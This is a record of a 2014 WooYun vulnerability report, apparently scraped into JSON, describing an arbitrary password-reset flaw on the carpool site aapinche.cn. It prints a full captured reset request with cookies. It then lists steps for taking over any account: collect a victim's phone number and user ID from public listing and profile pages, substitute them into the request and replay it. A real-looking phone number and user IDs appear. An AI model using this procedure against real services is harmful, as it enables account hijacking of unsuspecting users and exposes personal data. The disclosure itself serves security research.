{"id": 49730, "wybug_id": "wooyun-2014-080278", "wybug_title": "AA拼车网之任意密码找回2", "wybug_corp": "aayun.com", "wybug_author": "BMa", "wybug_date": "2014-10-22 10:00", "wybug_open_date": "2014-10-27 10:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： AA拼车网之任意密码找回2 详细说明：  前面提交过通过爆破验证码找回密码，这里是另外一个地方，也是密码找回首先看看正常流程密码找回时的数据包：\nPOST /account/safe/password/find/reset.aspx?do=submit HTTP/1.1Host: www.aapinche.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.aapinche.cn/ff/safe/password/find/reset.aspx?key=1751692&value=D5E8EA76F5CF4B5FE49DC6A3FFCD689EF25EA78E88874F4F19E7C7&other=CAXEBXABCXDXZOALOVFContent-Length: 38Cookie: bdshare_firstime=1413864086456; ASP.NET_SessionId=o4doyk5aylalrncvlx1pb1ww; aapinche_validatecode=code=2652C66B690BFCB25EEDFE46636BFC3; aapinche_find=loginid=xxx@qq.com&userid=17517xx; X-Forwarded-For: 8.8.8.8Connection: keep-alivePragma: no-cacheCache-Control: no-cachePassword=blackmanba&ConfirmPass=blackmanba\n存在的问题是服务器在验证时只验证了loginid和userid是否匹配，匹配就可以重置密码，所以我们可以抓正常重置密码的数据包，然后提交其他用户的loginid和userid，loginid可以为邮箱和手机号。并且这个数据包的存活时间非常长，几个小时都ok。那么怎么得到loginid和userid呢？往下看   漏洞证明：  重置任意用户密码步骤：1，注册一个用户，找回密码抓取数据包\n\n2，可以在拼车页面查看联系方式，找到手机号例如：http://www.aapinche.cn/yichang/11119889.html\t查看联系方式：得到login-id手机号码：13872652111\n\n3，接下来点击图像，跳转到链接http://www.aapinche.cn/user/1461883.html得到：user-ID：1461883\n\n\n\n4，在抓取的数据包中，填入对应的loginid和userid，repeat数据包，重置密码成功\n\n   修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-27 10:02 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}